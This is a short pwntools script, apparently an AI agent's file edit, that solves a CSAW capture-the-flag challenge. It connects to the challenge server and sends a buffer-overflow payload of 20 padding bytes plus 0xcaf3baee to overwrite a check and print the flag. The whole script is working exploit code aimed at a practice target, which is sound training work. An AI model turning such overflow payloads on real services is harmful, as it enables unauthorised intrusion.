from pwn import *

# Connect to the challenge server
p = remote('pwn.chal.csaw.io', 1436)

# Receive the initial message
p.recvuntil(b'Are you a big boiiiii??\n')

# Craft the payload
# 20 bytes of padding + 0xcaf3baee in little-endian
payload = b'A' * 20 + p32(0xcaf3baee)

# Send the payload
p.send(payload)

# Try to receive the flag directly
try:
    flag = p.recv(timeout=2)
    print(flag.decode('ascii', errors='ignore'))
except:
    # If that fails, try to get everything
    flag = p.recvall(timeout=2)
    print(flag.decode('ascii', errors='ignore'))

p.close()
end_of_edit

